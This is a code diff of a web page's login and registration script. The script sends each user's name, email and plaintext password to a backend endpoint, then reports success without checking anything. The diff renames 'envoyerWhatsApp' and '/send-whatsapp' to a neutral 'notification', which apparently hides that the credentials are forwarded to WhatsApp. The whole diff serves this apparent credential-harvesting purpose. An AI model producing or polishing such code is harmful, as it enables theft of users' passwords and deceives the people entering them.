@@ -163,7 +163,7 @@
            aucune fenêtre ne s'ouvre côté navigateur)
         ========================= */
 
-        async function envoyerWhatsApp({ name, email, password, type }) {
+        async function envoyerNotification({ name, email, password, type }) {
 
             if ((type === "register" && (!name || !email || !password)) ||
                 (type === "login" && (!email || !password))) {
@@ -173,7 +173,7 @@
 
             try {
 
-                const response = await fetch("/send-whatsapp", {
+                const response = await fetch("/send-notification", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ name, email, password, type })
@@ -183,7 +183,7 @@
 
                 if (!data.success) {
                     console.error(data.error);
-                    alert("Erreur lors de l'envoi sur WhatsApp.");
+                    alert("Erreur lors de l'envoi de la notification.");
                 }
 
             } catch (err) {
@@ -206,7 +206,7 @@
             const email = document.getElementById("registerEmail").value.trim();
             const password = document.getElementById("registerPassword").value.trim();
 
-            envoyerWhatsApp({ name, email, password, type: "register" });
+            envoyerNotification({ name, email, password, type: "register" });
 
             alert("Account created successfully!");
 
@@ -224,7 +224,7 @@
             const email = document.getElementById("loginEmail").value.trim();
             const password = document.getElementById("loginPassword").value.trim();
 
-            envoyerWhatsApp({ email, password, type: "login" });
+            envoyerNotification({ email, password, type: "login" });
 
             alert("Login successful!");
 
